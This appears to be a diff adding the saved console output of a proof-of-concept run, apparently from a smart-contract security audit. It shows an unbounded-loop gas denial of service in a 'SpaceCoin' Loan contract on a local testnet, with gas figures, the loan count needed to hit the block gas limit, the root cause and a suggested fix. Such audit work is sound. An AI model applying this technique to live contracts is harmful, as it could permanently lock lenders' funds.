@@ -1,0 +1,36 @@
+======================================================================
+  SpaceCoin F3 — Loan.checkExpiredLoans() Unbounded Loop DoS PoC
+  CWE-400: Uncontrolled Resource Consumption (Gas DoS)
+======================================================================
+
+[*] Starting local Anvil testnet ...
+[*] Anvil running on http://127.0.0.1:8547 (PID 26389)
+[*] Running forge script: script/PocLoanUnboundedLoop.s.sol
+
+======================================================================
+  SpaceCoin — F3: Loan.checkExpiredLoans() Unbounded Loop DoS PoC
+======================================================================
+
+  [deploy] MockLoanToken: 0x5FbDB2315678afecb367f032d93F642f64180aa3
+  [deploy] Loan:          0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
+  [fund]   Creating and funding 150 loans (1 wei principal each) ...
+  [check]  Measuring checkExpiredLoans() gas after 150 funded loans ...
+  === ATTACK CONFIRMED ===
+  checkExpiredLoans() gas with 150 funded loans: 126194
+  Gas per funded loan (warm storage):                841
+  Funded loans to hit 30M block gas limit:           35671
+  Root cause: loop iterates fundedLoanIndex.firstIdx -> nextIdx.
+  After DoS: lender tokens already sent, repay() reverts -> fund loss.
+  Fix: cap loop iterations per call or use a pull-based expiry pattern.
+  ==========================
+  ==========================
+
+======================================================================
+  RESULT: VULNERABILITY CONFIRMED
+  Gas grows O(N) with funded loans.
+  repay() / fundLoan() / partialRepay() become permanently DoS'd.
+  Lender principal unrecoverable once block gas limit exceeded.
+======================================================================
+
+[*] Shutting down Anvil ...
+[*] Done.
